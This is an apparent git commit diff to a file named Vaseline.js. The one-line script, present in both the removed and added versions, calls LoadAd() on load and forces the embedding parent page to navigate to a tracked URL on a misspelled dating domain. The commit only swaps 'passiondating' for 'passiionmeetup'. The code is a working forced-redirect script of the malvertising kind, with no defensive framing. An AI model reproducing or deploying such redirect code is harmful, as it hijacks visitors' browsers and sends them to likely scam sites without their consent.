3ba49d5615e7e38b76b865be0e4abd65a1c75da1
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2026-04-25 20:42:52 +0700

    Vaseline.js

--- Vaseline.js
+++ Vaseline.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://jdbqg.passiiondating.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2195360&s3=Vaseline"; } LoadAd();
+function LoadAd() { parent.location.href="https://jdbqg.passiionmeetup.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2195360&s3=Vaseline"; } LoadAd();
